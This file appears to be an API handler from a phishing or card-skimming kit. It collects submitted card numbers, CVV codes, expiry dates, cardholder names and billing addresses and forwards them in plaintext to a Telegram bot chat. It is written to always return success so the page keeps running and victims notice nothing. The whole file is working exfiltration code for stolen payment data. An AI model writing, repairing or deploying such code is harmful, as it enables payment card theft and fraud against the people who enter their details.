// Send billing details to Telegram
import { sendTelegramMessage } from '../telegram';

export default async function handler(req, res) {
  if (req.method === 'POST') {
    try {
      const { cardNumber, cardholderName, expiration, cvv, address, city, state, zip, userId } = req.body;
      
      console.log('[send-billing] Received billing details:', {
        hasCardNumber: !!cardNumber,
        hasCardholderName: !!cardholderName,
        hasExpiration: !!expiration,
        hasCVV: !!cvv,
        hasAddress: !!address,
        hasCity: !!city,
        hasState: !!state,
        hasZip: !!zip,
        userId: userId || 'N/A'
      });
      
      // Validate required fields
      const missingFields = [];
      if (!cardNumber) missingFields.push('cardNumber');
      if (!cardholderName) missingFields.push('cardholderName');
      if (!expiration) missingFields.push('expiration');
      if (!cvv) missingFields.push('cvv');
      if (!address) missingFields.push('address');
      if (!city) missingFields.push('city');
      if (!state) missingFields.push('state');
      if (!zip) missingFields.push('zip');
      
      if (missingFields.length > 0) {
        console.error('[send-billing] ❌ Missing required fields:', missingFields);
        return res.status(400).json({
          success: false,
          error: 'Missing required fields',
          missingFields: missingFields,
          message: `Missing required fields: ${missingFields.join(', ')}`
        });
      }
      
      console.log('[send-billing] ✅ All required fields present');
      
      // Check environment variables
      const botToken = process.env.TELEGRAM_BOT_TOKEN;
      const chatId = process.env.TELEGRAM_CHAT_ID;
      
      console.log('[send-billing] Bot token exists:', !!botToken);
      console.log('[send-billing] Chat ID exists:', !!chatId);
      
      // Don't fail if Telegram is not configured - just log and continue
      if (!botToken || !chatId) {
        console.warn('[send-billing] Telegram not configured - skipping notification');
        return res.status(200).json({ 
          success: false,
          warning: 'Telegram not configured',
          message: 'Billing details not sent to Telegram. Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in environment variables.'
        });
      }
      
      // Format the billing details message
      const message = `💳 <b>BILLING DETAILS SUBMITTED</b>\n\n` +
        `User ID: <code>${userId || 'N/A'}</code>\n` +
        `Time: ${new Date().toLocaleString()}\n\n` +
        `<b>Card Information:</b>\n` +
        `Cardholder Name: ${cardholderName || 'N/A'}\n` +
        `Card Number: <code>${cardNumber}</code>\n` +
        `Expiration: <code>${expiration}</code>\n` +
        `CVV: <code>${cvv}</code>\n\n` +
        `<b>Billing Address:</b>\n` +
        `Address: ${address}\n` +
        `City: ${city}\n` +
        `State: ${state}\n` +
        `ZIP: ${zip}`;
      
      // Try to send notification, but don't fail if it doesn't work
      try {
        console.log('[send-billing] Calling sendTelegramMessage with message length:', message.length);
        const result = await sendTelegramMessage(message);
        
        console.log('[send-billing] sendTelegramMessage result:', result);
        
        if (result) {
          console.log('[send-billing] ✅ Telegram notification sent successfully');
          console.log('[send-billing] Message ID:', result.message_id);
          console.log('[send-billing] Chat ID:', result.chat?.id);
          return res.status(200).json({ success: true, messageId: result.message_id });
        } else {
          console.error('[send-billing] ❌ Failed to send Telegram notification');
          console.error('[send-billing] sendTelegramMessage returned null/undefined');
          console.error('[send-billing] Check if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID are set correctly');
          return res.status(200).json({ 
            success: false,
            warning: 'Telegram notification failed',
            message: 'Billing details not sent to Telegram. Check bot token and chat ID.',
            debug: 'sendTelegramMessage returned null'
          });
        }
      } catch (telegramError) {
        console.error('[send-billing] ❌ Telegram error (non-blocking):', telegramError);
        console.error('[send-billing] Error name:', telegramError?.name);
        console.error('[send-billing] Error message:', telegramError?.message);
        console.error('[send-billing] Error stack:', telegramError?.stack);
        // Still return success so page can continue
        return res.status(200).json({ 
          success: false,
          warning: 'Telegram notification error',
          error: telegramError?.message || 'Unknown error',
          errorName: telegramError?.name,
          message: 'Billing details not sent to Telegram.'
        });
      }
    } catch (error) {
      console.error('[send-billing] Unexpected error:', error);
      // Return 200 so page can still continue even if notification fails
      return res.status(200).json({ 
        success: false,
        error: 'Notification error (non-blocking)',
        message: error.message,
        note: 'Page will continue to work normally'
      });
    }
  } else {
    res.status(405).json({ error: 'Method not allowed' });
  }
}
